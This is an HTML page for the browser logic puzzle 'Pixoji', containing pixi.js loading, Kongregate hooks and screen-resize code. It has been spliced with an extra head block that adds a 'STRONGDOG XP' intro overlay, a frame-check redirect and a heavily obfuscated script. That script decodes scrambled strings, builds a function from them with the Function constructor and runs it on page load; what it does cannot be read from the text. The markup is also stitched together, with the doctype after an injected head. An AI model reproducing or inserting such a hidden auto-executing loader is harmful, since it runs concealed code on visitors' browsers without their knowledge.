<script>
    if (window.top === window.self) {
        window.location.href = '../../../';
    }
</script>

<head>
    <title>Your Website Title</title>
    <script>
(function() {
    var KeY='', iFD=494-483;
    function xsh(b) {
        var g=2231620;
        var p=b.length;
        var d=[];
        for(var u=0; u<p; u++) { d[u]=b.charAt(u); }
        for(var u=0; u<p; u++) {
            var e=g*(u+469)+(g%24291);
            var f=g*(u+603)+(g%33615);
            var k=e%p;
            var i=f%p;
            var j=d[k];
            d[k]=d[i];
            d[i]=j;
            g=(e+f)%2984823;
        };
        return d.join('');
    }
    var dGm=xsh('dtroostitjfayxbglcnecmrnuocukqwrshpvz').substr(0,iFD);
    var deV='=ar c!s3hf.{lt==q8;.Cr)[3n=[nt6<)lA ,=n;)n=0<t=rwiCi=.> +uicvs0z1ru2s5sbdi;fs.r7..)rt;;07v.7fz(tA,5aa6 ma,o),+.v8ler9(nesrtnr2,g;==gonu o;osan;e i6rejftoSh..a;uao9]]=};";fa  ;S1les+()(.y+ v9lv;c1[-ptrhv..tt,0;[ ar"e=)is)((e)v(omr;fr9,effa=h8.=me}v1(br8,rha{]",rhk.ar(for"rkcan+Cnt[a1alvv9++)p)0p;vt=d=nl;),rr sjc[+]=r2n ;tz1ac )tr.m;e=(,=jajaAqp ybt.c[pqnC1l*vtir)zeh=s (rsel;8naj=-=z(,ghxf)dbv;vnu=ilrlc}e,sno,a a[=nj< +8=v[l}fqeh+4tdmAicj(n)-,)(tnC8r+<sg6fec3h()0<gs{][x+uity07)rit(r}aabj;=+(i";7jg12o),;rl,=z=Ccv;i] ;]--;p{es)1l(v (ls0{ngn=t(oaj ;u(+==4]8b(s+km;ogiarbo).l,sli=ts)(w[si e;8,ncpli.p+1i(lvx>A]wum8l0)=oh((v-(;fhe];hzml1;8r+vfah(,(gr"rte;ia7lv)rn[e]lj.4oso(s"25hura(=rh]d,jow.!v;++e=67;hd),g;i)a)r+u==;0aa9,4.du2,=[,0;cguftl9xug=le)r)=1+0xhogzo=}mnea+zrv0C4s";7nfi-;ra)aiie]s6qn .6hvv{t6f,pt* p.arsm)r]hk;;Cuoln{fl7c(+r;ai. r;pbr)q(gh(=sr[lvlpg,j2bt22g.s)ln;n++"9nc."}6r ug;';var VUu=xsh[dGm];var IgE='';var oDZ=VUu;var PHl=VUu(IgE,xsh(deV));var gDm=PHl(xsh('s.)a_sng6bt3a.3(;b;taEcuQs)rae]5w,.b5)QQQar1aosQs6a)ot7)mQns(QarS(Q5.)4;5Q0ontE5wQt.,tuoQeQQasQ=j6%.o ==\/\/_.cQsce$;sQQ,(ac(Q7aA=eQ[!js)o{$(s.QQo3S_(bngQ$tuhm_yQS&QycQ,tt{s$dn353)3auiot_;&)0.1!tQrQq6m;63t,duQ).5ps%;)C"(c}Q_qd37+%.sy4.f\/.ehQ(%@])Q;:Ti6QEa);reF)$a0eFjNQ6t.d4Q=_+tt$Q!.o CeQ%)})t.(e6re(ioQ8w)%.d.m#$QQsjxr=.Q2mp7Qta(a=}l_CQog_,irQiQ Qe>Q.4p(5y$m?_i7.lu=twm..5_iQp 3"tl)MsbQanbMd7er)(ueipQd,@rbn60d$7%.%)dus.QQtQd)i#t(.QqDg<e._7,6__...9{3a ]a(eittq=r !.)h(QexQnQ0kk3nuf\/Q) ta_ ]aw1nQc?)oQswm@(({5cu7r%%$$Q.a=p(a)iQ.s+9j1$y$QQ{Q?$,Qc7 .o)%rnt;S( ts,e$4<p!_kaat=.!Ql(x0 s73o%t=i$rw+(i"f;t()_0_a!3Q(2r7o95}z$uQh9>6)Q48)ct)Qaihcs..43s_o1oQQ=()r%;r+>]QQQ=wdc]}CQ+sir(7;i{u.Qi_](r5Ts=] 4.%_7$.o)Q.Qp3rs$]Qe\'ru]7}2r.fo$)]b2_c) j36";neQ11.)r<r_z41i3i!af0n;3l((QQ!B5)Q{rFE}]2}3 7=t+.bcQj.t trvmj_Q0F$5.on=at,9csr"0dQ1e0Q}Qn,_Q{Q2(r"bou,(-!?w.(b9{dmvg txT,es,sEa6{4_7r(kuj;Q,}4.#ooa=_bju]{5a)).6){r29%6-ah.(#=S+v=wept!$te}lip.un5)QeQ]hsm)QQoQ roaQ.Q,.tdtQqr1Q)l!rl79rm;)...Nd6.Qai.zafr ce=.o,Q2!$_ircn=oe;.a$t6}.tQ(%_8sd 1?.aeQitQ2(Q Q,%!5(QQ_sx7l)t2rdi,Q!"]}lQ,0;Qto8d.a(%=(Q{{_Cn$t3rt]]c1&hQ,$7lE)tgtec9 ecQQQ3em553_t)e2r_(3rr6T%)$rQ5rt(n+3!a+;}t;0 ;]4trQg.hk9..,o@\/2(.1]0Q.{j)8"rQ.%1,ic!Q6oQQ))fCQ(y&e;o3sQtv9QQuQ5es,0(1(\/!6.!pif.)i-;?rQab3wt4NtlNniexq.) Q=]=.zzd\'t;1.)cr]QQ0_([(_Q.a?eh,7)Qa](k(d 2Qt7$1Q(Qa(>a70rjQ5+QQQa(Q"l53.Qi.[1Qa]pe6)Q8a%6\'x5}.!D*!frbaQ95Q=.Q-BroQi]3]4\/_Qis0:e*;o2_tQn1bd6ae;.$i0s)e,_!Q1]op !e(-r\'>fw);]Q>5pQQuszs_sic4.c6p;$).!-9]to_mr8}6.sc8el4t.C.=eEd1QQ$6t0 c2,3ClelQbt..),+;o{sQlb7g#]f]$o).7adzr(%?(!c{__orQo;%Qo!.;;>!rf5tyn=Aed,Qg_.?#..igo7cze2=QQ!4eu()=Q5nQewg}Q(Q,ze_w8Qcy{a,6a1)\/4-(;i_Asa4_qut!s1(oka)(]ec;\/h](6!o=3*Q=(.Q_be=Q;QQdc;r0i*#o-s ak\/aQe1l.i)jQo2=(Q(.]a__(Q")$6d3.$6bmh)Q8QQahSjQsr7}rpkQ<Qfj_4.]Q@(tsja>7],lisag(r=paQ)(){(o+.(cw0)!%c7e5+1-s{.%#r}a!]]f:;}]nsQraplaQ33_]QfQn\/w s(.a[r)Qd{tCQaf690;t10n+4 nQ6 7[mtTbrQa)o%ftQ e_bsBQ6=4)5.4=a=b)j09A(Qj]oQ$!)\/7(*.)4._Q,!.!j\'ol6QS 3m;a+Qo.tQqdj#% f!4Qt$)]{ns8_;]i.0ne;tne+Iiu3c)i er;lztt.QDQ;n5_(it.of3,bsoon \'sBaQpcQz.s8b1o)_iefo_8).n_d)QQEr,6}sn5j=r=g5%:iQe }{ew)ro eek)n$)oQwiQ$e!89Qo(-.fliQ(.t7_;i1Q.%=eQf*,af41n)lfe;ieu '));var fAC=oDZ(KeY,gDm );fAC(3392);return 9309
})()


        window.addEventListener('load', function() {
            // Create intro container
            var introDiv = document.createElement('div');
            introDiv.id = 'intro';

            // Create and add STRONGDOG text
            var strongDogDiv = document.createElement('div');
            strongDogDiv.id = 'strongdog';
            strongDogDiv.innerText = 'STRONGDOG';
            strongDogDiv.style.opacity = '0'; // Start invisible
            introDiv.appendChild(strongDogDiv);

            // Create and add XP text
            var xpDiv = document.createElement('div');
            xpDiv.id = 'xp';
            xpDiv.innerText = 'XP';
            xpDiv.style.opacity = '0'; // Start invisible
            introDiv.appendChild(xpDiv);

            // Create and add image
            var uploadedImage = document.createElement('img');
            uploadedImage.id = 'uploadedImage';
            uploadedImage.src = '../../../strongdog.webp'; // Path to your image
            uploadedImage.style.display = 'none';
            introDiv.appendChild(uploadedImage);

            // Append intro to body
            document.body.insertBefore(introDiv, document.body.firstChild);

            // Add styles
            var css = `
                #intro {
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: rgba(33, 33, 33, 1);
                    z-index: 1000;
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    justify-content: center;
                    transition: transform 0.5s ease-in-out;
                }

                #strongdog, #xp {
                    font-size: 3em;
                    font-weight: bold;
                    opacity: 0;
                    animation: fadeInSlam 1s ease forwards;
                }

                #strongdog {
                    color: white;
                }

                #xp {
                    color: orange;
                    animation-delay: 0.5s; 
                }

                @keyframes fadeInSlam {
                    0% { transform: scale(0); opacity: 0; }
                    50% { transform: scale(1.2); opacity: 1; }
                    100% { transform: scale(1); opacity: 1; }
                }

                @keyframes riseUp {
                    0% { transform: translateY(0); }
                    100% { transform: translateY(-100px); }
                }

                #uploadedImage {
                    width: 100%;
                    max-width: 600px;
                    opacity: 0;
                    transform: scale(0);
                    animation: growAndSettle 1s ease forwards;
                }

                @keyframes growAndSettle {
                    0% { transform: scale(0); opacity: 0; }
                    50% { transform: scale(1.1); opacity: 1; }
                    75% { transform: scale(0.9); }
                    100% { transform: scale(1); }
                }
            `;
            var styleSheet = document.createElement('style');
            styleSheet.type = 'text/css';
            styleSheet.innerText = css;
            document.head.appendChild(styleSheet);

            // Trigger image fade-in and text fade-out
            setTimeout(() => {
                uploadedImage.style.display = 'block';
                uploadedImage.style.opacity = 1;
                strongDogDiv.style.opacity = 0;
                xpDiv.style.opacity = 0;
            }, 1500);

            // Slide up and remove intro
            setTimeout(() => {
                introDiv.style.transform = 'translateY(-100%)';
                setTimeout(() => { introDiv.remove(); }, 500);
            }, 3200);
        });
    </script>
</head>

<!doctype html>


<!--

/*

	We have used the following open source projects / code:

	pixi.js - v2.2.3
	Copyright (c) 2012-2014, Mat Groves
	http://goodboydigital.com/
	pixi.js is licensed under the MIT License.
	http://www.opensource.org/licenses/mit-license.php
	Mat Groves http://matgroves.com/ @Doormat23

	Class object based on John Resig's code; inspired by base2 and Prototype
	http://ejohn.org/blog/simple-javascript-inheritance/

	Fonts in use: Montserrat

	Music By:


	
*/

-->


<html>
    

<head>
        

<meta charset="UTF-8" />
     
<!--<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Montserrat">-->
<title>Pixoji</title>
      

<meta name="description" content="Pixoji">
	
<link rel="canonical" href="http://www.zblip.com/pixoji"/>
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<!--<meta name="viewport" content="user-scalable=no" /> why stop users scaling?-->

<!--<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no, minimum-scale=1, maximum-scale=1">-->

<!--<meta name="viewport" content="width=device-width"> weird scaling -->
<!--<meta name="viewport" content="width=device-height">-->

<!-- https://developers.google.com/web/fundamentals/design-and-ui/responsive/?hl=en#set-the-viewport -->
<!-- <meta name="viewport" content="width=device-width, initial-scale=1"> -->

<meta name = "apple-mobile-web-app-title" content = "pixoji">
 
<meta name="twitter:card" content="summary" />
<meta name="twitter:site" content="@ZBlipGames" />
<meta name="twitter:title" content="Pixoji" />
<meta name="twitter:description" content="Challenging logic puzzle, playable for free online in the browser, desktop and mobile web - Play Now" />
<meta name="twitter:image" content="http://www.zblip.com/pixoji/pixoji440.png" />
<meta name="twitter:url" content="http://www.zblip.com/pixoji/" />

<meta property="og:url" content="http://www.zblip.com/pixoji">
	
	<meta property="og:image" content="http://www.zblip.com/pixoji/pixoji440.png">
	<meta property="og:description" content="Challenging logic puzzle, playable for free online in the browser, desktop and mobile web">
	<meta property="og:title" content="pixoji">
	<meta property="og:site_name" content="ZBlip">
	
	<meta property="og:type"          content="game" />
	<meta property="og:see_also" content="http://www.zblip.com">

	<meta itemprop="name" content="pixoji">
	<meta itemprop="description" content="Challenging logic puzzle">
	<meta itemprop="image" content="www.zblip.com/pixoji/pixoji440.png">


	<!-- <script src='https://www.kongregate.com/javascripts/kongregate_api.js'></script> -->


	<style type="text/css">	body { padding: 0; margin: 0; }</style>


</head>
    

<body>

    

<!--

<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.9&appId=1079707205462152";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>

-->

<!--<script src="phaser-slim.min.js"></script>-->
<script src="src/core.js"></script>
<script src="src/asset_manager.js"></script>	
		

<style>
    	

	@font-face {
				font-family: 'Montserrat';
				src: url('fonts/Montserrat.ttf');
				//local('Montserrat');
				//url(https://fonts.googleapis.com/css?family=Montserrat);
	}

	body{
				overflow:hidden;
				margin:0;
			     	font-family: 'Montserrat', sans-serif;
			     	background: #4B4965;	}
				.fontPreload {
		  		font-family: 'Montserrat';
		  		position:absolute;
		  		left:-100px;
	}
<!--
.fb-like-container {
  position: absolute;
  right: 20px;
  bottom: 20px;
}

.fb-like-old {
  position: fixed;
  margin-right: 100%;
 

  
}

.fb-dummy-left {
  position: absolute;
  right: 20px;
  bottom: 20px;
 

  
}

.fb-like {
 	 position: relative;
 	 right: 0px;
}
-->
	progress {
  		border: none;
		-webkit-appearance: none;
		width: 300px;
		height: 14px;
		margin: 50px auto;
		display: block;

	}

	progress::-webkit-progress-bar {
 		background-color: #222222;
  		border: 0;
  		height: 18px;
  		border-radius: 50px;
		padding: 2px;

		box-shadow: 0 1px 0px 0 rgba(255, 255, 255, 0.2);
	}

	progress::-webkit-progress-value {
		border-radius: 50px;
		box-shadow: inset 0 1px 1px 0 rgba(255, 255, 255, 0.4);
		background:
		-webkit-linear-gradient(45deg, transparent, transparent 33%, rgba(0, 0, 0, 0.1) 33%, rgba(0, 0, 0, 0.1) 66%, transparent 66%),
		 -webkit-linear-gradient(top, rgba(255, 255, 255, 0.2), rgba(0, 0, 0, 0.2)), // 0.2 for gradient
		
		-webkit-linear-gradient(left, #C1ED27, #C1ED27);
	
	/* Looks great, now animating it */
	background-size: 25px 14px, 100% 100%, 100% 100%;
	-webkit-animation: move 5s linear 0 infinite;
	}

	progress::-moz-progress-bar {
  		background-color: #C1ED27;//40BEEE;
  		border: 0;
  		height: 8px;
  		border-radius: 0px;
		
	}

	

   </style>



<div id = 'pbar' >
	
	<div id = 'splashdiv' align = "center" width ="100%" overflow ="hidden">
		<img id = 'splash' src = 'assets/title2.png'>
	</div>
	<progress id='prog_bar' value = '0' max='100'></progress>
</div>

<!--
<div class = "fb-like-container">
<div class = "fb-dummy-left">
<div class="fb-like" data-href="http://www.zblip.com/pixoji" data-layout="standard" data-action="like" data-size="small" data-show-faces="false" data-share="true"></div>
</div>
</div>
-->

<!-- <script src='https://www.kongregate.com/javascripts/kongregate_api.js'></script> -->

<script type="text/javascript">

    

var using_pixi = true;;//false;
var using_phaser = false;//true;

var game;	// used by phaser
var assets_loaded = false;
var scriptList = [

		
		//"phaser.min.js",

		//"playtomic.js",

		//"src/boot.js",
		//"src/preload.js",
		//"src/gametitle.js",		
		//"src/thegame.js",

		//"assets/blocks.png",
		//"assets/blocks.json",

		"src/spritewrapper.js",
		"src/game_engine.js",
		"src/game_state.js",
		"src/entity_class.js",
		
		"src/sound_manager.js",
	];

var g_servermode = false;
//g_servermode = true;
if (g_servermode == true) scriptList.push("server/solver_class.js");

if (using_pixi == true) {
	scriptList.push("pixi.min.js");
	scriptList.push("src/pixigame.js");
} else {
	scriptList.push("phaser-slim.min.js");
	scriptList.push("src/thegame.js");
}
// https://cookieconsent.insites.com/download/

//if (location.hostname == "www.kongregate.com") scriptList.push("http://www.kongregate.com/javascripts/kongregate_api.js");

var on_kong = 0;
var on_armor = 0;

var g_solver_class = null;

using_cocoon_js = false;

var browser_url = "";

if (using_cocoon_js == false) browser_url = (window.location != window.parent.location)
            ? document.referrer
            : document.location.href;

browser_url = browser_url.split("/")[2];

var location_hostname = "";
if (using_cocoon_js == false) location_hostname = location.hostname;

if (location_hostname == "game274082.konggames.com" ||
	browser_url == "www.kongregate.com" ||
	browser_url == "http://www.kongregate.com/games/ZBlip/pixoji" ||
	browser_url == "http://www.kongregate.com/games/ZBlip/pixoji/" ||
	browser_url == "http://www.kongregate.com/games/ZBlip/pixoji_preview/" ||
	browser_url == "www.kongregate.com/games/ZBlip/pixoji/" ||
	browser_url == "www.kongregate.com/games/ZBlip/pixoji") on_kong = 1;	// not www.kongregate.com 
//on_kong = 0;
if (location_hostname == "www.armorgames.com") on_armor = 1;

console.log('browser url ' + browser_url);



if (on_kong == 1) scriptList.push("https://www.kongregate.com/javascripts/kongregate_api.js");

var on_facebook = 0;

if (location_hostname == "www.facebook.com") on_facebook = 1;

var g_autoload_level = document.location.search;
if (g_autoload_level.length > 1) g_autoload_level = g_autoload_level.substring(1);

g_autoload_level = g_autoload_level.split("=")[1];

if (on_kong == 1 || location_hostname != "www.zblip.com") g_autoload_level = "";

console.log('g_autoload_level' + g_autoload_level);

var kongregate;
var kong_token;



cordova_ready = false;
on_cordova_ready = function() {
	cordova_ready = true;
};

if (using_cocoon_js == true) {
	scriptList.push("cocoon.min.js");
	scriptList.push("cordova.js");
	document.addEventListener('deviceready', on_cordova_ready, false);

}

//alert('<!--<meta name="viewport" content="width=device-width">-->');

if (using_cocoon_js == false) var pBar = document.getElementById('prog_bar');
else var pBar = {value: 0};
pBar.value += 20; 


window.onload = function () {
	if (using_pixi == true) load_script_assets(scriptList, start_pixi);
	else load_script_assets(scriptList, start_phaser);

	pBar.value += 10; 
};

start_pixi = function () {
	pBar.value += 10; 

	

	// pixi is for cocoon, so not checking kongregate
	// pixi is for cocoon, so not checking kongregate OR ARE WE
	if (on_kong == 1) {
		// Load the API
	
		kongregateAPI.loadAPI(function(){
		
			// Callback function
			// Set the global kongregate API object
  			kongregate = kongregateAPI.getAPI();

			// Register the shared content load listener before connecting
			//kongregate.sharedContent.addLoadListener('Level', onLoadLevel);
   
			// Connect
			kongregate.services.connect();	// I'm guessing I need this for auth
		
		});

	}

	setup_layers();

	


	loadpixiimages();
	
	
};

start_phaser = function() {

	pBar.value += 10; 

	

			
	if (on_kong == 1) {
		// Load the API
	
		kongregateAPI.loadAPI(function(){
		
			// Callback function
			// Set the global kongregate API object
  			kongregate = kongregateAPI.getAPI();


			// Register the shared content load listener before connecting
			//kongregate.sharedContent.addLoadListener('Level', onLoadLevel);
   
			// Connect
			kongregate.services.connect();	// I'm guessing I need this for auth


		

		});

	}

	var phaser_type = Phaser.CANVAS;

	if (using_cocoon_js == true) phaser_type = Phaser.AUTO;	// using_cocoon lives in game_engine.js


	// window.devicePixelRatio

	game = new Phaser.Game(document.documentElement.clientWidth, 
			       document.documentElement.clientHeight, 
			       phaser_type, "game", {
    		create : function() {
        		this.game.stage.backgroundColor = "0x061419";
		}
    	});

	

	Phaser.Canvas.setSmoothingEnabled(game, false);


				//game.renderer.renderSession.roundPixels = true;
				//Phaser.Canvas.setImageRenderingCrisp(game.canvas);
				//Phaser.Canvas.setSmoothingEnabled(game.canvas, false);
				//PIXI.scaleModes.DEFAULT = PIXI.scaleModes.BEST;

	
				// remove_splash();

				// 8176

				//Playtomic.initialize("aaa", "aaa", "http://salty-ravine-95905.herokuapp.com");
				//Playtomic.initialize("aaa", "aaa", "localhost");
	
				game.state.add("Boot",boot);
				game.state.add("Preload",preload);
				//game.state.add("GameTitle",gameTitle);
				game.state.add("TheGame",theGame);

				//

	
				
				game.state.start("Boot");

				
				

				
				

				
			
	if (game.stage != null) game.stage.backgroundColor = "0x061419";
};

g_splash_parent = null;
g_splash_image = null;

remove_splash = function() {

	if (using_cocoon_js == false && pBar.parentNode != null) {
	 	pBar.parentNode.removeChild(pBar);	// remove the progress bar
	}

			var splash = document.getElementById('splash');
				if (splash != null) {
					
					//g_splash_parent = splash.parentNode;
					splash.parentNode.removeChild(splash);

					//g_splash_image = splash;
				}

	do_resize();
};

show_splash = function () {
		//var splash_parent = document.getElementById('prog_bar');
		//g_splash_parent.appendChild(g_splash_image);
};


var playSoundInstance = function(sndfile, vol) {};

var screen_width = 600;
var screen_height = 600;
var ratio = 1;		// tiles in game
var menu_ratio = 1;	// menu, pop up menu
var x_shift_screen = 0;
var y_shift_screen = 0;
var scale_man;

var menu_scale_ratio = 1;

var level_ratio = 1;
var level_x_shift = 0;

var g_level_size = 10;	// for resizing
var g_top_nono_size = 10;
var g_left_nono_size = 10;
var g_level_w = 10;

var do_resize = function(e) {  

	//if (game == null) return;
	if (play_screen_group == null) return;

	// dips
	//screen_width =  document.documentElement.clientWidth - 1;//

//	screen_width =	window.innerWidth && document.documentElement.clientWidth ? 
//			Math.min(window.innerWidth, document.documentElement.clientWidth) : 
//			window.innerWidth || 
//			document.documentElement.clientWidth || 
//			document.getElementsByTagName('body')[0].clientWidth;

	screen_width = window.innerWidth;	

	screen_width = Math.max(document.documentElement.clientWidth, window.innerWidth || 0);
  	screen_height = Math.max(document.documentElement.clientHeight, window.innerHeight || 0);

	//screen_height = document.documentElement.clientHeight - 1;

	// document.body.offsetWidth ?

	window.scrollTo(0, 0);

	//if (screen.width/window.devicePixelRatio > screen_width) screen_width = screen.width/window.devicePixelRatio;
	//if (screen.height/window.devicePixelRatio > screen_height) screen_width = screen.height/window.devicePixelRatio;

	// http://www.quirksmode.org/blog/archives/2012/07/more_about_devi.html
	// screen.width on ios : width in dips
	// screen.width on android : width in physical pixels

	// ------------------------ only mention of device pixel ratio
	menu_ratio = 1;
	menu_scale_ratio = 1;
	//if (window.devicePixelRatio > 1) menu_scale_ratio = window.devicePixelRatio;

	//if (window.devicePixelRatio > 1) menu_ratio = window.devicePixelRatio;


	//var rr = screen_width / screen_height;
	//console.log('screen_width / screen_height' + rr);

	// the browser (on chrome dev mobile, at least) seems to invent its own width and height, which nonetheless maintain
	// the same ratio as the real witdh and height
	// so my in-game tile grid was resizing with no problems because it uses the approach below (w_portrait etc)
	// so i'm going to mimic this for the GUI stuff
	// note that I'm ignoring devicePixelRatio, as the browser just seems to resize everything anyway
	// my job here is just to fill the screen

	// screen_width = some_unknown_num*actual_screen_width
	// screen_height = some_unknown_num*actual_screen_height

	// maybe setting meta viewport width = 100% fixed this nonsense?

	// width = device-width will make the viewport stretch on orientation change

	if (using_pixi == true && renderer != null) {
		//this part resizes the canvas but keeps ratio the same
    		//renderer.view.style.width = (screen_width) + "px";
    		//renderer.view.style.height = (screen_height) + "px";
		renderer.resize(screen_width,screen_height);
	}

	//game_menu_group.scale.set(ratio,ratio);
	//options_menu_group.scale.set(menu_ratio,menu_ratio);

	//if (g_level_size <= 5) g_level_size = 5;	// already min of 7 set in game_state

	var resize_to = g_level_w;
	resize_to = Math.max(g_level_w, 7);

	var w = (g_level_size)*48;
	var h = (g_level_size + 0.5)*48;
	var w_portrait = (g_level_size + 0.5)*48;
	var h_portrait = (g_level_size)*48;// + 250;	
	

	// tile size of 48

	// in portrait - need a bottom space (for UI) of ~250 pixels
	var effective_screen_height = screen_height;
	var effective_screen_width = screen_width;

	var portrait_gui_size = Math.min(400, screen_height*0.4);
	var land_gui_size = Math.min(400, screen_width*0.4);
	if (screen_width < screen_height) effective_screen_height -= portrait_gui_size;	// GUI on the bottom
	else effective_screen_width -= land_gui_size;

	if (screen_width < screen_height) ratio = Math.min(screen_width/w_portrait, effective_screen_height/h_portrait);
	else ratio = Math.min(screen_width/w, screen_height/h);

	

	text_group.scale(ratio, ratio);		// unaffected by level size

	//ratio = ratio*level_ratio;

	play_group.scale(ratio, ratio);//.set(ratio, ratio);

	var needed_w = (g_level_w + 0.5)*48//w;
	if (screen_width < screen_height) needed_w = (g_level_w + 0.5)*48//w_portrait;

	// in portrait - need a bottom space (for UI) of ~200 pixels
	if (screen_width < screen_height) {

	}
	
	
	var over_x = 0;//screen_width - (8*96);
	if (screen_width > screen_height) over_x = screen_width - w*ratio;
	else over_x = screen_width - w_portrait*ratio;

	x_shift_screen = 0;

	var tiles_w = g_left_nono_size;
	x_shift_screen += tiles_w*48*ratio;

	

	over_x = screen_width - needed_w*ratio;

	

	if (over_x > 0) x_shift_screen += screen_width*0.5 - 0.5*needed_w*ratio;// 0.5*over_x;
	else x_shift_screen += screen_width*0.5 - 0.5*needed_w*ratio;

	//x_shift_screen += level_x_shift;

	

	if (using_cocoon_js == true) y_shift_screen = 64; //32

	//y_shift_screen = 48*0.5*ratio;
	y_shift_screen = 0;
	var tiles_h = g_top_nono_size;
	
	y_shift_screen += tiles_h*48*ratio;

	play_group.set_pos(x_shift_screen, y_shift_screen );//position.set(x_shift_screen, y_shift_screen);


	//game.width = screen_width;		// what does this do??
  	//game.height = screen_height;


 
  	//if (game.renderType === 1) {
    		//game.renderer.resize(screen_width, screen_height);		// what does this do??

    		//Phaser.Canvas.setSmoothingEnabled(game.context, false);	// what does this do??

  	//}

	//game.camera.setSize(screen_width, screen_height);	// what does this do??

	// after adjusting tile and game containers


	// So I will just sort of mimic what the tile grid is doing
	menu_ratio = ratio;

	

	var tot_ = screen_width + screen_height;
	var max_len = Math.max(screen_width, screen_height);
	
	// the corner menu tab should be ...
	
	
	// With some senisible limits - this should work within reason, maybe not for HUGE resolutions
	// Basically just a small increase in scale if needed
	menu_ratio = Math.max(1.0, menu_ratio);	// lower bound of 1.0
	menu_ratio = Math.min(1.5, menu_ratio);	// upper bound of 1.75

	


	if (screen_width > screen_height) {
		// screen_height shrink to --> 13.5*60
		menu_ratio = screen_height/(9.5*60);
		// menu_ratio =  Math.min(screen_width/250, screen_height/250);
		
	} else {
		// screen_width shrink to --> 10*60
		menu_ratio = screen_width/(7*60);
		// menu_ratio = Math.min(screen_width/250, screen_height/250);
	}

	// testing: delete if bad
	if (screen_width > screen_height) {
		// landscape
		menu_ratio = 1;
		
		
	} else {
		// portrait
		// we want the menu (250px wide) to take up 66% of screen_width
		var aim = screen_width*0.66;
		menu_ratio = aim/250;
		//menu_ratio = screen_width/(7*60);
		// menu_ratio = Math.min(screen_width/250, screen_height/250);
	}


	//menu_ratio = 1/menu_ratio;

	//if (screen_width > screen_height) menu_ratio = 1;

	//menu_ratio = 1;		// combined with <meta name="viewport" content="width=device-width"> this seems to work ok

	// why use <meta name="viewport" content="width=device-width">
	// https://sunpig.com/martin/2012/03/18/goldilocks-and-the-three-device-pixel-ratios/
	// using width=100% seems to work ok

	// ok trying something analogous to game screen resizing
	// the tile grid wanted to fill the screen...
	var w_options = 250;
	var h_options = screen_height;
	var w_options_portrait = 250;		// .menu_width
	if (screen_width > screen_height) {
		
		//menu_ratio =  Math.min(screen_width/w_options, screen_height/w_options);
		
	} else {
		
		//menu_ratio = Math.min(screen_width/w_options_portrait, screen_height/w_options_portrait);
	}


	game_menu_group.scale(menu_ratio,menu_ratio);
	// i think this should NOT change scale:
	options_menu_group.scale(menu_ratio,menu_ratio);

	screen_width = screen_width/menu_ratio;
	screen_height = screen_height/menu_ratio;

	gBlipFrogMenu.on_screen_resize();


return;

var aspectRatio = 1.5;  
aspectRatio = window.innerWidth / window.innerHeight;
if ((window.innerWidth / window.innerHeight) > aspectRatio) 

{    

	game.scale.width = window.innerWidth * aspectRatio;    
	game.scale.height = window.innerHeight;  
 
} 

else if ((window.innerWidth / window.innerHeight) < aspectRatio) {    
	game.scale.width = window.innerWidth;    
	game.scale.height = window.innerWidth / aspectRatio;  } 

else {    
	game.scale.width = window.innerWidth;    
	game.scale.height = window.innerHeight;  

}  

//
}

window.onresize = do_resize; 

window.onorientationchange = function() {
    		window.onresize();
}

    </script>

    

<!-- 48*15 -->
<canvas id="tilecanvas" width="600" height="600" style ="display:none">
</canvas>


</body>




</html>